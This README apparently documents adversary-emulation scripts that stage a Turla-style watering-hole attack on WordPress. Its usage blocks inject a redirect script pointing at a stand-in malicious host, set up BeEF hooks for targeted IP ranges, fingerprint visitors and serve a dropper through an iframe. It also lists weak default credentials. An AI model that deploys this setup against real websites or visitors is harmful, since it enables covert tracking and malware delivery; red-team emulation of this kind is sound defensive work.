# Watering Hole

- [Watering Hole](#watering-hole)
  - [Overview](#overview)
  - [Expected Usage](#expected-usage)
  - [Package / OS Requirements](#package--os-requirements)
  - [Preflight Checks](#preflight-checks)
  - [Usage Examples](#usage-examples)
  - [Fingerprinting Details from BEEF (via Evercookie and other bundled tools)](#fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools)
    - [Browser-specific Details](#browser-specific-details)
    - [Browser-specific Capabilities](#browser-specific-capabilities)
    - [Hardware Details](#hardware-details)
    - [Location Information](#location-information)
  - [Cleanup Instructions](#cleanup-instructions)
  - [Credential Details](#credential-details)
  - [References](#references)
    - [CTI Evidence](#cti-evidence)
    - [Wordpress and Apache](#wordpress-and-apache)

## Overview

The watering hole setup scripts are made to streamline the already streamlined process of spinning up a wordpress server and then altering it to mimic either a "compromised" site or a malicious site. It has the following components:

| Component      | Description                                                                                                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| Setup          | shell script to install and initialize a generic wordpress site                                                                      |
| Redirection    | python script to append a js redirection script to an html/php file                                                                  |
| Fingerprinting | python script to install and explain setup of fingerprinting capabilities, including the in-range and out-of-range script files      |
| IP Range       | python script to prepend a php comparison to an html/php file                                                                        |
| Flash Prep     | python script to install iframe prompt for target and handler code within WordPress that toggles visibility based on cookie presence |
| "counter"      | surreptitiously named redirection js file - **REQUIRES CONFIG**                                                      |
| in-range.html  | script tag in html file that will load hook.js, applied to IP addresses designated by IP Range python script                         |
| Cleanup        | cleanup shell script; deletes all site data & database info; kills any processes anticipated to be running                           |

## Expected Usage

On the Kali C2 server (where the victim will be redirected to):

```bash
sudo bash wordpress_setup.sh
# edit counter.js
cp counter.js /srv/www/wordpress/counter.js #edited to redirect to where you want
python3 fingerprinting.py
# edit beef-master/config.yaml - change username, password, and name of cookie hook
python3 beef_setup.py
# edit in-range.html with the location of your BEEF hook.js file
python3 ip_range.py /srv/www/wordpress/index.php {1 or more IP addresses with or without masks} -i in-range.html -o out-of-range.html
cd beef-master; ./beef& # this will put beef on in the background
# {dropper file} is the file that you want the user to download on click
python3 flash_prep.py /srv/www/wordpress/index.php {dropper file}
```

On the external benign web server (where the victim will browse to, but will be infected with a watering hole):

```bash
sudo bash wordpress_setup.sh
python3 redirection.py /srv/www/wordpress/index.php http://infectionproxy/counter.js # {Infection Proxy URL including http:// + path to counter.js}
```

The setup and cleanup scripts are what they say on the tin: they will setup or teardown a wordpress site with default and wildly insecure credentials. This is all they do, to allow a user to further set up a watering hole attack as they see fit.

**The prep and cleanup scripts are expected to be run at superuser privileges;** these scripts create and drop databases in SQL, create public directories, and restart system services. Wordpress does not like being run at superuser privileges, so `sudo` is frequently used to _deescalate_ to user-level commands during the wordpress install proper.

The redirection script is intended to mimic the result of a site compromised by an injection attack - it appends a JS redirection script that points to a remote file (presumably counter.js) to be the src of a `script` tag. In conjunction, counter.js is expected to be placed on an infection proxy. When executing, write the redirection script to point to counter on the infection proxy host. **You must also edit counter.js when placing it on the infection proxy to redirect the user to where you will be checking their IP addresses - presumed to be the infection proxy host itself.**

The fingerprinting script installs the BEEF framework, reviews necessary config changes, and prepares user to run beef on local machine in anticipation of victim visit.

The beef setup script confirms that the user has changed BEEF's default credentials and reminds them to alter the appropriate IP information in their IP range script.

The ip range script creates a string of php code and places it in a php file on a separate wordpress site - the one that the client will be redirected to. It will determine if the client is in the range of IP addresses that are of further interest.

The flash prep script copies a string of iframe HTML to a file of your choosing, presumably the index page of your malicious website, and copies a dropper file to the root of your web server that will be downloaded when a user clicks the link inside the iframe.

Both shell scripts are run without argument.

`ip_range.py`, `redirection.py` and `flash_prep.py` scripts expect arguments. All python scripts accept the --help flag.

## Package / OS Requirements

These scripts were developed on, and are expected to be run on, a Kali Linux box, which is a Debian-based distribution. Service/system calls and package manager examples may differ between distributions.

These scripts expect default Kali installations of Apache web server and SQL(MariaDB). If you don't have them or they've been pruned from your Kali install, get them back with

```bash
apt install apache2
apt install default-mysql-server
```

An apache config file for the wordpress site should be included in the directory. Regardless, links below will be provided if one needs to be made from scratch.

Conversely, the wordpress install should create a wordpress config file for you, but this command expects a running SQL service.

If you are on a system _without_ SQL, instead uncomment the portion of the script that copies the config file to the wordpress directory, and comment out the SQL and wp config portions of the script. These places are commented appropriately.

If you are on a system with a SQL installation similar to Kali, the script will handle the creation of this config file for you.

## Preflight Checks

Preflight for a setup script? Yes, just please make sure that you've got everything operational. Get on to the box that you're installing things on:

```shell
ssh <user>@<IP of server>
```

Make sure that you've got apache and mysql running.

```bash
service apache2 restart
service mysql restart
```

Make sure that you've got sudo privileges

```shell
sudo whoami
```

Once you've installed beef via `fingerprinting.py`, check that you've changed the default credentials

```bash
python3 beef_setup.py # this preflight script does not update in-range.html and will remind you to do so
```

## Usage Examples

```bash
sudo bash wordpress_setup.sh

# On "compromised" Wordpress installation
python3 redirection.py /srv/www/wordpress/index.php https://malicious.url.com/counter.js

# On malicious Wordpress installation
vim counter.js # don't forget to edit counter.js to the URL you'd like the victim to be redirected to!

cp counter.js /srv/www/wordpress/counter.js

python3 fingerprinting.py

python3 beef_setup.py

python3 ip_range.py --help

python3 ip_range.py /srv/www/wordpress/index.php 10.10.10.0 10.10.10.1 -i in_range.html

python3 ip_range.py /srv/www/wordpress/index.php 10.10.10.0/31 -i in_range.html -o out_of_range.html
```

**Note that expected usage is that the redirection and the ip range / fingerprinting scripts are to be run on different servers.**

## Fingerprinting Details from BEEF (via Evercookie and other bundled tools)

Not all the information here is available on every machine. Some information will be listed as "Unknown", some information will simply be blank. This represents the information available to the developer when BEEF & evercookie was tested. This list is provided in case third parties ask about the specificity of detail that the fingerprinting tool provides, as opposed to the information specifically sought by the adversary when identifying the victim.

### Browser-specific Details

- Browser Engine (e.g. Gecko)
- Reported Name (e.g. Mozilla/5.0)
- Platform (e.g. Linux x86_64)
- Plugins (As opposed to "capabilities" below, this includes PDF viewer information)
- Cookies
- Hostname & Port
- Referrer
- Windows Height & Width
- URI

### Browser-specific Capabilities

- ActiveX
- Flash
- Google Gears
- PhoneGap / Apache Cordova
- QuickTime
- RealPlayer
- Silverlight
- VB Script
- VLC
- WebGL
- WebRTC
- WebSocket
- WMP

### Hardware Details

- Battery Level
- Architecture (e.g. x86_64)
- CPU Cores
- GPU Details / Driver (e.g. using llvm_pipe instead of dedicated GPU)
- Memory
- Screen Color Depth
- Screen Height & Width
- Is the screen touch-enabled?
- OS Architecture
- OS Family & Name
- OS Version

### Location Information

- City
- Country
- IP Address

## Cleanup Instructions

Cleanup script will drop wordpress database and user, delete wordpress files, and deactivate the wordpress apache config file.

```bash
sudo bash wordpress_cleanup.sh
```

If for any reason you need to separately stop, pause, or restart the BEEF process but you cannot remember the PID, list all ruby processes then investigate each one:

```bash
pgrep ruby # lists all processes run using ruby, which includes BEEF
ps -o cmd fp [PID] # identifies the command that spawned the PID
```

## Credential Details

For the SQL (MariaDB) installation, the script creates (and the config file expects) the following default credentials:

```text
username: wordpressuser
password: password
```

For the wordpress administration, the script creates (and wordpress expects) the following default credentials:

```text
username: wpcli
password: wpcli
```

For the beef installation, the installation has the following default credentials that must be changed in \*/beef-master/config.yaml

```text
username: beef
password: beef
```

## References

### CTI Evidence

- <https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/>
- <https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf>
- <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>

### Wordpress and Apache

- Wordpress reference: <https://developer.wordpress.org/cli/commands/>
- Apache configuration reference: <https://httpd.apache.org/docs/current/configuring.html>
- Create new Apache configuration: <https://ubuntu.com/tutorials/install-and-configure-apache>
